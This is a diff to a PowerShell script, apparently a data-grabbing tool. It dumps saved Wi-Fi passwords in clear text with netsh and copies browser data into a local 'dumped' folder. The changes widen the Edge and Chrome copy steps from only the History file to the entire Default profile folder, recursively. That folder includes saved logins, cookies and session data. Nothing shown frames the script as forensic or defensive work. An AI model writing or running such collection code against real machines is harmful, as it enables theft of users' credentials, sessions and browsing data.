@@ -42,9 +42,10 @@ Netsh wlan show profile name=$networkname key=clear > dumped/networkinfo.txt
 
 try {
     #This command copies edge history data to dumped/edge
-    $source_path_edge="C:\Users\$Env:UserName\AppData\Local\Microsoft\Edge\User Data\Default\History"
+    $source_path_edge="C:\Users\$Env:UserName\AppData\Local\Microsoft\Edge\User Data\Default"
     $destination_path_edge="dumped\edge"
-    Copy-Item -Path $source_path_edge -Destination $destination_path_edge -Force -ErrorAction Stop
+    Write-Host "Retreiving Edge Data..."
+    Copy-Item -Path $source_path_edge -Destination $destination_path_edge -Recurse -Force -ErrorAction Stop
     Write-Host "Collected Edge Browsing History `n" 
 }
 catch {
@@ -55,9 +56,10 @@ catch {
 
 try {
     #This command copies chrome history data to dumped/chrome.
-    $source_path_chrome="C:\Users\$Env:UserName\AppData\Local\Google\Chrome\User Data\Default\History"
+    $source_path_chrome="C:\Users\$Env:UserName\AppData\Local\Google\Chrome\User Data\Default"
     $destination_path_chrome="dumped\chrome"
-    Copy-Item -Path $source_path_chrome -Destination $destination_path_chrome -Force -ErrorAction Stop
+    Write-Host "Retreiving Chrome Data..."
+    Copy-Item -Path $source_path_chrome -Destination $destination_path_chrome -Recurse -Force -ErrorAction Stop
     Write-Host "Collected Chrome Browsing Historym `n"
 }
 catch {
